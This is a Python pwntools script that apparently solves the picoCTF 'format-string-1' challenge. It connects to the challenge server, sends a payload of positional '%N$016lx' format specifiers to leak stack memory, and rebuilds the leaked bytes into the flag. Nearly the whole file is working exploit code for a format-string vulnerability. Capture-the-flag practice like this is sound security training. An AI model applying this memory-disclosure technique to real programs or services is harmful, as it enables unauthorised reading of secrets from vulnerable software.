from pwn import *

# Set up the binary
binary = './format-string-1'  # Replace with the actual path to your binary
# elf = context.binary = ELF(binary)

# Connect to the remote service
host = 'mimas.picoctf.net'
port = 65353
p = remote(host, port)

# Line to stop at: 0x401313

# Disable ASLR and PIE
# context.aslr = False
# context.binary = binary
# context.binary.pie = False

# Start the process
# p = process(binary, aslr=False)

# # wait for someone to print enter
# input("Press Enter to continue...")

# Wait for the prompt "number?"
prompt = p.recvuntil(b'to you:')
print("Received prompt:", prompt.decode())

# Create the payload
print_byte = b'%x,'
byte_line = print_byte*32 + b'|'
payload = b'|' + byte_line * 32 # Adjust the number of repetitions as needed
# print("Sending payload:", payload.decode())

# Craft payload to read 4-byte chunks 
num_chunks = 16
start_chunk = 14
payload = b'|'
for i in range(num_chunks):
    fmt_chunk = "%{}$016lx,".format(i + start_chunk)
   # fmt_chunk = "%16lx,"
    payload += fmt_chunk.encode()

# payload = b'%14$x,' * 16
payload += b'|'
print("Sending payload:", payload.decode())
# wait for someone to print enter
# input("Press Enter to continue...")
# Send the payload
p.sendline(payload)

# # Wait for someone to press enter
# input("Press Enter to continue...")

# Print the response
response = p.recvall()
print("Received response:", response.decode())

response_str = response.decode()
# Split the response by pipe
stripped_list = response.split(b'|')[1]

# Split the response by comma (each is 4 bytes)
chunk_list = stripped_list.split(b',')

num_bytes = 0
raw_bytes = b""
for chunk in chunk_list:
    # Split into 2 character chunks
    byte_chunks = []
    for i in range(0, len(chunk), 2):
        byte_chunks.append(chunk[i:i+2])
    
    # Reverse the order of the chunks
    chunk_bytes_str = byte_chunks[::-1]
    # Convert byte of string to string then to actual byte
    chunk_bytes = b""
    for byte in chunk_bytes_str:
        chunk_bytes += bytes.fromhex(byte.decode())

    raw_bytes += chunk_bytes
    #print(reassembled.decode(), end="")
    num_bytes += 4

raw_bytes = raw_bytes + b"\x00"
print("\n\nReassembled bytes:", raw_bytes)

print("\nTotal bytes:", num_bytes)
    